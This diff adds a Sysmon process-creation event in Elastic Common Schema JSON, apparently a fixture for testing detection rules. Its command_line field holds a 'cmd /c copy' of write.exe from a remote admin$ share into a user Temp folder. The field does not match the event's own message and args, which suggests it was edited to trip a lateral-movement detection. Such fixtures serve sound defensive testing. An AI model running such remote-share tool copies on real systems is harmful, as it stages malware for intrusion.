@@ -1,0 +1,136 @@
+{
+  "@timestamp": "2021-02-04T20:25:04.836Z",
+  "related": {
+    "user": "breach",
+    "hash": [
+      "0d17999868f2768b1b050cb051884110",
+      "e72f5dba2a177397403965a3352f0cc45ec46a568a53d5ef4535fbba18e73023"
+    ]
+  },
+  "hash": {
+    "md5": "0d17999868f2768b1b050cb051884110",
+    "sha256": "e72f5dba2a177397403965a3352f0cc45ec46a568a53d5ef4535fbba18e73023"
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "winlog": {
+    "user": {
+      "name": "SYSTEM",
+      "domain": "NT AUTHORITY",
+      "type": "User",
+      "identifier": "S-1-5-18"
+    },
+    "event_data": {
+      "OriginalFileName": "winlogbeat.exe",
+      "IntegrityLevel": "High",
+      "FileVersion": "7.10.2",
+      "LogonId": "0x25612",
+      "LogonGuid": "{19FC45AC-53AD-601C-0000-002012560200}",
+      "TerminalSessionId": "1",
+      "Company": "Elastic",
+      "Description": "Winlogbeat ships Windows event logs to Elasticsearch or Logstash.",
+      "Product": "Winlogbeat"
+    },
+    "process": {
+      "pid": 1524,
+      "thread": {
+        "id": 1780
+      }
+    },
+    "version": 5,
+    "computer_name": "CLIENT",
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+    "event_id": 1,
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "task": "Process Create (rule: ProcessCreate)",
+    "opcode": "Info",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "record_id": 1128,
+    "api": "wineventlog"
+  },
+  "host": {
+    "name": "CLIENT",
+    "hostname": "CLIENT",
+    "architecture": "x86",
+    "os": {
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0",
+      "platform": "windows",
+      "version": "6.1",
+      "family": "windows"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "ip": [
+      "192.168.56.254",
+      "172.16.1.1",
+      "fe80::5efe:c0a8:38fe",
+      "fe80::5efe:ac10:101"
+    ],
+    "mac": [
+      "00:50:56:00:01:01",
+      "00:50:56:00:00:01",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ]
+  },
+  "user": {
+    "domain": "client",
+    "name": "breach"
+  },
+  "process": {
+    "entity_id": "{19FC45AC-5820-601C-0000-0010B7750E00}",
+    "pid": 3108,
+    "parent": {
+      "entity_id": "{19FC45AC-5508-601C-0000-001011C60B00}",
+      "pid": 3988,
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+      "name": "powershell.exe",
+      "args": [
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      ]
+    },
+    "hash": {
+      "md5": "0d17999868f2768b1b050cb051884110",
+      "sha256": "e72f5dba2a177397403965a3352f0cc45ec46a568a53d5ef4535fbba18e73023"
+    },
+    "executable": "C:\\Program Files\\Winlogbeat\\winlogbeat.exe",
+    "command_line": "cmd /c copy \\\\192.168.0.23\\admin$\\write.exe C:\\Users\\ADMINI~1\\AppData\\Local\\Temp",
+    "working_directory": "C:\\Program Files\\Winlogbeat\\",
+    "name": "winlogbeat.exe",
+    "args": [
+      "C:\\Program Files\\Winlogbeat\\winlogbeat.exe",
+      "setup",
+      "--template"
+    ]
+  },
+  "agent": {
+    "version": "7.10.2",
+    "hostname": "CLIENT",
+    "ephemeral_id": "8d71002f-bbaa-43e7-9f1b-6316d51fcd53",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT",
+    "type": "winlogbeat"
+  },
+  "log": {
+    "level": "information"
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 20:25:04.836\nProcessGuid: {19FC45AC-5820-601C-0000-0010B7750E00}\nProcessId: 3108\nImage: C:\\Program Files\\Winlogbeat\\winlogbeat.exe\nFileVersion: 7.10.2\nDescription: Winlogbeat ships Windows event logs to Elasticsearch or Logstash.\nProduct: Winlogbeat\nCompany: Elastic\nOriginalFileName: winlogbeat.exe\nCommandLine: \"C:\\Program Files\\Winlogbeat\\winlogbeat.exe\" setup --template\nCurrentDirectory: C:\\Program Files\\Winlogbeat\\\nUser: client\\breach\nLogonGuid: {19FC45AC-53AD-601C-0000-002012560200}\nLogonId: 0x25612\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=0D17999868F2768B1B050CB051884110,SHA256=E72F5DBA2A177397403965A3352F0CC45EC46A568A53D5EF4535FBBA18E73023\nParentProcessGuid: {19FC45AC-5508-601C-0000-001011C60B00}\nParentProcessId: 3988\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+  "event": {
+    "created": "2021-02-04T20:30:49.651Z",
+    "module": "sysmon",
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start",
+      "process_start"
+    ],
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "action": "Process Create (rule: ProcessCreate)"
+  }
+}
